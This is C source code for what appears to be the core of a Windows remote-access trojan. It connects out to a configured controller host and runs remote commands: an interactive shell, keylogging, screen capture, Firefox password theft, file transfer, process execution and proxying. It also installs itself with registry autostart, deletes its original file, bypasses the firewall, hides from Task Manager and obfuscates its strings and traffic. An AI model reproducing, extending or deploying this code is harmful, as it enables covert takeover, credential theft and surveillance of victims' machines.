#include "stuff.h"
#include "config.h"
#include "externals.h"


thread_s		threads[MAX_THREADS];
int				proxyport = 0;


void Uninstall()
{
#ifndef NO_AUTOSTART
	DisableAutoStart(regkey);
#endif

#ifndef NO_INSTALL
	UninstallMe(filename);
#endif

	fWSACleanup();
}

BOOL NET_Initialize()
{
	WSADATA WSAdata;
	
	int Error = fWSAStartup(MAKEWORD(2, 2), &WSAdata);
	if (Error) 
	{
#ifdef DEBUG
		printf("WSA error!\n");
#endif
		return FALSE;
	}
	else
	{
#ifdef DEBUG
		printf("WSA initialized.\n");
#endif
		return TRUE;
	}
}


unsigned int NET_Resolve(char *host) 
{
    struct	hostent		*hp;
    unsigned int		host_ip;

    host_ip = finet_addr(host);
    if (host_ip == INADDR_NONE) 
	{
        hp = fgethostbyname(host);
        if (hp == 0) 
            return 0;
		else 
			host_ip = *(u_int *)(hp->h_addr);
    }

    return host_ip;
}


int NET_Connect(char *host, unsigned short port)
{
	unsigned int		resv_host;
	struct sockaddr_in	address;
	SOCKET				sock;

#ifdef DEBUG
	printf("Connecting to: %s:%d\n", host, port);
#endif

	resv_host = NET_Resolve(host);
	if (resv_host == 0)
		return -1;

	address.sin_addr.s_addr = resv_host;
	address.sin_family = AF_INET;
	address.sin_port = fhtons(port);

	if ((sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return -2;

	if (fconnect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
		return -3;
	else
		return sock;
}


int NET_EncodeAndSend(SOCKET sock, char *data, int len)
{
	int		i;

	for (i = 0; i < len; i++)
		data[i] = ~ data[i];

	return fsend(sock, data, len, 0);
}


int NET_Send(SOCKET sock, sendmsgtype_s msgtype, char *buffer)
{
	char	tempbuff[MAX_RECEIVE_BUFFER] = {0};

	switch (msgtype)
	{
	case ECHO:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s\n", strings[Decode(s_echo)].encoded);
		break;
	case LOGIN:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s\"%s\n", strings[Decode(s_login)].encoded, buffer);
		break;
	case SHELL:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_shell)].encoded, buffer);
		break;
	case INFO:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_info)].encoded, buffer);
		break;
	case FILES:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_files)].encoded, buffer);
		break;
	case FILEACTION:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_fileaction)].encoded, buffer);
		break;
	case FILEINOUT:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_fileinout)].encoded, buffer);
		break;
	case PROCESS:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_process)].encoded, buffer);
		break;
	case PROCESSACTION:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_processaction)].encoded, buffer);
		break;
	case KEYLOGGERACTION:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_keyloggeraction)].encoded, buffer);
		break;
	case PROXYACTION:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_proxyaction)].encoded, buffer);
		break;
	case CAPTUREACTION:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_captureaction)].encoded, buffer);
		break;
	case CAPTURESEND:
		_snprintf(tempbuff, sizeof(tempbuff) - 1, "%s %s\n", strings[Decode(s_capturesend)].encoded, buffer);
		break;
	default:
		return 0;
	}

//	Clearencoded();

#ifdef DEBUG
	printf("Out: %s", tempbuff);
#endif

	return NET_EncodeAndSend(sock, tempbuff, strlen(tempbuff));
}


int NET_Login(SOCKET sock)
{
	char	buff[MAX_RECEIVE_BUFFER];

	// login name protocolversion keylogger proxy
	_snprintf(buff, sizeof(buff) - 1, "\"%s\"%s\"%d\"%d\n", name, PROTOCOLVERSION, Thread_Check(T_KEYLOGGER), proxyport);
	NET_Send(sock, LOGIN, buff);

	return 1;
}


int NET_CheckTimeout(SOCKET sock)
{
	struct timeval		timeout;
	fd_set				fd;

	timeout.tv_sec = cfg_cmaxwaittime;
	timeout.tv_usec = 0;

	FD_ZERO(&fd); 
	FD_SET(sock, &fd);

	return fselect(sock, &fd, NULL, NULL, &timeout);
}


int NET_Parse(SOCKET sock, char *buffer, int currhost)
{
	char	*a1, *a2 = NULL, *a3;

#ifdef DEBUG
	printf("In: %s|\n", buffer);
#endif

	a2 = strchr(buffer, ' ') + 1;
	a1 = strtok(buffer, " ");
	
	if (a1 == NULL)
		return 0;

	else if (!strcmp(a1, strings[Decode(s_echo)].encoded))
	{
		if (NET_Send(sock, ECHO, NULL) == SOCKET_ERROR)
			return -1;
		else
			return 1;
	}
	else if (!strcmp(a1, strings[Decode(s_die)].encoded))
	{
		return -2;
	}
	else if (!strcmp(a1, strings[Decode(s_uninstall)].encoded))
	{
		Uninstall();
		return -2;
	}
#ifndef NO_REBOOT
	else if (!strcmp(a1, strings[Decode(s_reboot)].encoded))
	{
		Reboot(false);
		return 1;
	}
	else if (!strcmp(a1, strings[Decode(s_shutdown)].encoded))
	{
		Reboot(true);
		return 1;
	}
#endif
#ifndef NO_INFO
	else if (!strcmp(a1, strings[Decode(s_info)].encoded))
	{
		INFO_SendInfoData(sock);
		return 1;
	}
#endif
#ifndef NO_FIREFOX
	else if (!strcmp(a1, strings[Decode(s_firefox)].encoded))
	{
		FIREFOX_FindPasses(sock);
		return 1;
	}
#endif
#ifndef NO_CAPTURE
	else if (!strcmp(a1, strings[Decode(s_capturescreen)].encoded))
	{
		CAP_Screen(sock, a2, cdata[currhost].host);

		return 1;
	}
#endif
	else if (a2 == NULL)
		return 0;
#ifndef NO_FILES
	else if (!strcmp(a1, strings[Decode(s_files)].encoded))
	{
		FILES_Main(sock, a2);
		return 1;
	}

	else if (!strcmp(a1, strings[Decode(s_filedel)].encoded))
	{
		FILES_Delete(sock, a2);
		return 1;
	}

	else if (!strcmp(a1, strings[Decode(s_filemkdir)].encoded))
	{
		FILES_MakeDir(sock, a2);
		return 1;
	}

	else if (!strcmp(a1, strings[Decode(s_filedeldir)].encoded))
	{
		FILES_DeleteDir(sock, a2);
		return 1;
	}

	// fileout/filein bindport filedestination
	else if (!strcmp(a1, strings[Decode(s_fileout)].encoded) || !strcmp(a1, strings[Decode(s_filein)].encoded))
	{
		a3 = strchr(a2, ' ') + 1;

		if (a3 == NULL)
			return 0;

		a2[a3 - a2 - 1] = 0;

		if (!strcmp(a1, strings[Decode(s_fileout)].encoded))
		{
			FILES_SendAndGet(sock, a3, cdata[currhost].host, atoi(a2), TRUE, FALSE);
			return 1;
		}
		else
		{
			FILES_SendAndGet(sock, a3, cdata[currhost].host, atoi(a2), FALSE, FALSE);
			return 1;
		}
	}
#endif
#ifndef NO_PROCESS
	else if (!strcmp(a1, strings[Decode(s_process)].encoded))
	{
		if (!strncmp(a2, strings[Decode(s_refresh)].encoded, 7))
		{
			PROC_List(sock);
			return 1;
		}
		else if (!strncmp(a2, strings[Decode(s_kill)].encoded, 4))
		{
			a3 = strchr(a2, ' ') + 1;

			if (a3 == NULL)
				return 0;

			PROC_Kill(sock, atoi(a3), 1);

			return 1;
		}
		else if (!strncmp(a2, strings[Decode(s_run)].encoded, 3))
		{
			a3 = strchr(a2, ' ') + 1;

			if (a3 == NULL)
				return 0;

			PROC_Run(sock, a3);

			return 1;
		}
		else
			return 0;
	}
#endif
#ifndef NO_MSGBOX
	else if (!strcmp(a1, strings[Decode(s_msgbox)].encoded))
	{
#ifdef DEBUG
		printf("Doing messagebox...\n");
#endif
		InjectMessageBox(a2);

		return 1;
	}
#endif
#ifndef NO_SHELL
	else if (!strcmp(a1, strings[Decode(s_shell)].encoded))
	{
		if (!strncmp(a2, strings[Decode(s_on)].encoded, 2))
		{
			// launch shell
			if (Thread_Check(T_SHELL))
			{
#ifdef DEBUG	
				printf("Shell thread already running!\n");
#endif
				return 1;
			}

#ifdef DEBUG	
			printf("Launching shell...\n");
#endif

			shell_s s;
			s.sock = sock;
			s.tnum = Thread_Add(T_SHELL);

			threads[s.tnum].tHandle = Thread_Start(SHELL_Thread, &s);

			return 1;
		}
		else if (!strncmp(a2, strings[Decode(s_off)].encoded, 3))
		{
			// end shell
#ifdef DEBUG
			printf("Stopping shell.\n");
#endif
			SHELL_Stop();
			Thread_Kill(T_SHELL);

			return 1;
		}
		else if (!strncmp(a2, strings[Decode(s_msg)].encoded, 3))
		{
#ifdef DEBUG
			printf("Putting in shell.\n");
#endif
			a3 = strchr(a2, ' ') + 1;
			SHELL_WriteIn(a3);
			SHELL_WriteIn("\n");
			return 1;
		}
		else
			return 0;
	}
#endif
#ifndef NO_KEYLOGGER
	else if (!strcmp(a1, strings[Decode(s_keylogger)].encoded))
	{
		if (!strcmp(a2, strings[Decode(s_off)].encoded))
		{
#ifdef DEBUG
			printf("Stopping keylogger.\n");
#endif
			Thread_Kill(T_KEYLOGGER);

			return 1;
		}
		else
		{
			if (Thread_Check(T_KEYLOGGER))
			{
#ifdef DEBUG
				printf("Keylogger already running.\n");
#endif
				return 1;
			}

#ifdef DEBUG
			printf("Starting keylogger thread, file: %s\n", a2);
#endif
			keylogger_s k;
			k.sock = sock;
			_snprintf(k.filedest, sizeof(k.filedest) - 1, "%s", a2);
			k.tnum = Thread_Add(T_KEYLOGGER);

			threads[k.tnum].tHandle = Thread_Start(KL_Thread, &k);

			return 1;
		}
	}
#endif
#ifndef NO_PROXY
	else if (!strcmp(a1, strings[Decode(s_proxy)].encoded))
	{
		if (!strcmp(a2, strings[Decode(s_off)].encoded))
		{
#ifdef DEBUG
			printf("Stopping proxy.\n");
#endif
			Thread_Kill(T_PROXY);
			Thread_Kill(T_PROXYCLIENT);
			proxyport = 0;

			return 1;
		}
		else
		{
			if (Thread_Check(T_PROXY))
			{
#ifdef DEBUG
				printf("Proxy already running.\n");
#endif
				return 1;
			}

			a3 = strchr(a2, ' ') + 1;

#ifdef DEBUG
			printf("Starting proxy thread, port: %d, data: %s\n", atoi(a2), a3);
#endif
			proxy_s p;
			p.sock = sock;
			p.port = atoi(a2);
			proxyport = p.port;
			_snprintf(p.data, sizeof(p.data) - 1, "%s", a3); 
			p.tnum = Thread_Add(T_PROXY);

			threads[p.tnum].tHandle = Thread_Start(PROXY_Thread, &p);

			return 1;
		}
	}
#endif
	// todo: parsing shit
	else 
		return 0;
}


int NET_Listen(SOCKET sock, int currhost)
{
	int		ret, 
			len, l;
	char	buffer[MAX_RECEIVE_BUFFER];

	while (sock > 0)
	{
		len = 0;
		memset(buffer, 0, sizeof(buffer));
		while ((ret = NET_CheckTimeout(sock)) > 0)
		{
			if (len == MAX_RECEIVE_BUFFER - 1)
				break;
			l = frecv(sock, buffer + len, 1, 0);
			if (l <= 0 || l == WSAECONNRESET)
				return 0;
			buffer[len] = ~ buffer[len];
			len += l;
			if (buffer[len-1] == '\n') // \n for ending order
				break;
		}
		
		if (ret <= 0)
			return ret;
		else if (len < 2)
			continue;
		else
		{
			buffer[len-1] = 0;
			if ((ret = NET_Parse(sock, buffer, currhost)) < 0)
				return ret;
		}
	}

	return sock;
}


int NET_Begin()
{
	int			sock;
	int			i = 0, 
				ret = 1;

	while (1)
	{
		if (cdata[i].host == NULL)
			i = 0;

		if ((sock = NET_Connect(cdata[i].host, cdata[i].port)) > 0)
		{
			if (NET_Login(sock) > 0)
			{
#ifdef DEBUG
				printf("Connected. Now waiting for instructions.\n");
#endif
				ret = NET_Listen(sock, i);

				switch (ret)
				{
				case 0:
#ifdef DEBUG
					printf("Connection closed.\n");
#endif
					break;
				case -1:	// SOCKET_ERROR
#ifdef DEBUG
					printf("Socket error occured.\n");
#endif
					break;
				case -2:
#ifdef DEBUG
					printf("Have to say goodbye now...\n");
					Sleep(1000);
#endif
					return 0;
				default:
#ifdef DEBUG
					printf("Unknown connection error.\n");
#endif
					break;
				}

				fclosesocket(sock);
				i = 0;
			}
		}
		else
		{
#ifdef DEBUG
			switch (sock)
			{
			case -1:
				printf("Failed to resolve host.\n");
				break;
			case -2:
				printf("Socket initialization failed.\n");
				break;
			case -3:
				printf("Failed to connect to master client: %s:%d\n", cdata[i].host, cdata[i].port);
				break;
			default:
				printf("Unknown socket error.\n");
			}
#endif
			i++;
		}

		Sleep(cfg_reconnectsleep);
	}

	// never reached
	return 0;
}


void DecodeCfgStrings()
{
	unsigned int	i;

	DecodeSemiString(filename);
	DecodeSemiString(description);
	DecodeSemiString(regkey);

	for (i = 0; cdata[i].host != NULL; i++)
		DecodeSemiString(cdata[i].host);

#ifdef DEBUG
	printf("Name: %s\nFileName: %s\nDescription: %s\nRegKey: %s\n", name, filename, description, regkey);
#endif
}

#ifdef DEBUG
int main()
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
#endif
{

#ifndef DEBUG
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
#endif

	LDLLs();

	if (WaitForSingleObject(CreateMutex(NULL, FALSE, cfg_mutex), 33634) == WAIT_TIMEOUT)
		ExitProcess(0);

#ifdef DEBUG
	printf("Dlls loaded.\n");
#endif

	// use this - very hard to hex edit binary :)))
	DecodeCfgStrings();

	// decode keylogger keys
	KL_DecodeKeys();

	// check install, if not installed, install me
#ifndef NO_INSTALL
	InstallMe(filename);

	// delete original file
	if (__argc > 1) 
		Melt(__argv, __argc, errormessage);	
#endif

	// check autostart, if not in autostart mode, add autostart
#ifndef NO_AUTOSTART
	EnableAutoStart(regkey, __argv[1]);
#endif

	// firewall bypass
#ifndef NO_FIREWALLBYPASS
	WinFWBypass(description);
#endif

#ifdef DEBUG
	printf("Initializing net..\n");
#endif
	if (!NET_Initialize())
		return 0;

	Thread_Prepare();

	// taskmgr process hidder
#ifndef NO_PROCHIDDER
	sys_proch_s s;
	s.sleeptime = cfg_taskmgrchecksleeptime;
	s.tnum = Thread_Add(T_PROCHIDE);
	threads[s.tnum].tHandle = Thread_Start(SYS_ProcHidder, &s);
#endif

	NET_Begin();

	return 0;
}
